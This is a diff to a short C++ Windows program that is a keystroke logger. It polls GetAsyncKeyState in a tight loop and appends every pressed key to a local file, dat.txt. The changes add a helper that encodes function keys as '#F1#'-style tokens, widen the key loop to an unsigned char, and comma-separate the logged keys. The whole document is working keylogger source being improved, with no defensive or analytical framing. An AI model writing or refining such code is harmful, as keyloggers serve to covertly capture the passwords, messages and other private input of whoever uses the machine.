@@ -7,7 +7,7 @@ using namespace std;
 
 
 void save(string input) {
-	cout << input;
+	cout << input << ", ";
 	fstream LogFile;
 	LogFile.open("dat.txt", fstream::app);
 	if (LogFile.is_open()) {
@@ -59,6 +59,29 @@ string parseUnprintable(int S_key) {
 }
 
 
+string parseToString(char key) {
+
+	string parsed = parseUnprintable(key);
+
+	if (parsed != "")
+		return parsed;
+	else if (key >= 48 && key <= 90)
+		parsed += key;
+	else if (key >= 112 && key <= 123) {
+		parsed += "#F";
+		if (key <= 120)
+			parsed += (key - 63);
+		else {
+			parsed += '1';
+			parsed += (key - 73);
+		}
+		
+		parsed += '#';
+	}
+
+	return parsed;
+}
+
 
 int main()
 {
@@ -66,16 +89,11 @@ int main()
 
 	while (true) {
 		Sleep(10);
-		for (char key = 8; key <= 190; key++)
+		for (unsigned char key = 8; key <= 165; key++)
 		{
-			if (GetAsyncKeyState(key) == -32767) {
-				if (parseUnprintable(key) != "")
-					save(parseUnprintable(key));
-
-				if (true) {
-					save(key);
-				}
-			}
+			if (GetAsyncKeyState(key) == -32767)
+				save(parseToString(key));
+			
 		}
 	}
 
